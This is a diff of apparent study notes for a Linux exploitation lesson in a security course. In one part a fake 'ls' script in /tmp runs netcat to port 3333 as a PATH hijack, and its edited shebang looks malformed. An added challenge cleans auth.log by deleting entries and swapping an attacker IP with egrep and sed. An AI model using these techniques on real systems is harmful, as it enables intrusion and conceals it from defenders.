@@ -954,7 +954,7 @@ https://sec.cybbh.io/public/security/latest/lessons/lesson-10-linux-exploit_sg.h
     cd into /tmp
     make a script.
     nano ls
-    #!/bin/bash
+    #!/bin/bash -e /bin/bash
     nc 127.0.0.1 3333
 
     chmod it. chmod +x ls
@@ -971,8 +971,17 @@ https://sec.cybbh.io/public/security/latest/lessons/lesson-10-linux-exploit_sg.h
     
     
 
-    
-    
+## Log cleaning example question.
+
+        In order to receive credit for this challenge you must provide the md5sum of the auth.log after it has been cleaned.
+
+    There are log entries from the network you pivoted from.
+    The user name is 'billybob'
+    You don’t know the exact IP address but you know the network is a 172.16.0.0/16
+
+        cat auth.log | grep 172
+        egrep -v '21:51:32|10:02:15' auth.log > auth.lame
+        sed -i 's/172.16.34.4/192.168.1.103/g' auth.lame
 
     
         
